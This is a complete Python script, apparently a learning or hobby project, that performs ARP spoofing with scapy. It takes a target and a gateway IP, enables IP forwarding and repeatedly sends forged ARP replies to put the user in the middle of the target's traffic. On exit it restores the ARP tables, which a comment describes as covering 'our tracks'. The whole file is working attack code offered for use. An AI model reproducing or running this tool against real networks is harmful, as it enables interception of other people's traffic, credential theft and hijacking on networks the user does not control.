#!/usr/bin/python3
###########################################################################################################################################
#                                                                                                                                         #
# ARP Spoofer: Supply a target IP and IP of gateway or router and become the man in the middle intercepting all traffic from target IP!   #
#                                                                                                                                         #
###########################################################################################################################################

import scapy.all as scapy
import time
import sys
import os
import argparse
import iptools

#Checking for root
if os.getuid() != 0:
    print("[-]Please run with root privileges!")
    sys.exit()
else:
    pass

#Get MAC address for supplied IP
def get_mac(ip):
    
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    answer = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    
    return answer[0][1].hwsrc


#Build the packet response with routers ip and our MAC
def spoof(target_ip, spoof_ip):
    
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#Restore original ARP tables to cover our tracks cleanly
def restore_arp(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


#Get arguments from command line
parser = argparse.ArgumentParser(description="Supply IP addresses of a target machine and the gateway to intercept traffic from target IP", usage="arp_spoofer.py -t [Target IP] -g [Gateway IP]")
parser.add_argument('-t', '--target', help='IP address of target machine', required=True)
parser.add_argument('-g', '--gateway', help='IP address of gateway', required=True)
args = parser.parse_args()

#Pass args to variables
target_ip = str(args.target)
gateway_ip = str(args.gateway)


#Check to see if a valid IP was used to avoid errors
if iptools.ipv4.validate_ip(target_ip) == True and iptools.ipv4.validate_ip(gateway_ip) == True :
    packet_count = 0
    print("[!]Enabling packet forwarding.....")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print("[+]Begin ARP spoofing")
    try:
        while True:
            
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packet_count += 2
           
            print("\r[+]Packets Sent: " + str(packet_count), end ='')
            time.sleep(2)
    except KeyboardInterrupt:
        
        print("\n[+]Detected interupt.....")
        print("[+]Restoring ARP tables and disabling packet forwarding.....")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        restore_arp(target_ip, gateway_ip)
        restore_arp(gateway_ip, target_ip)
        print("[!]Good Bye!")

else:
        print("[-]Please use valid IPs")



### Place below code in proper location and uncomment to show the detailed packet info anytime packet is defined helpful for debugging or jsut curiosity
#print(packet.show())
#print(packet.summary())
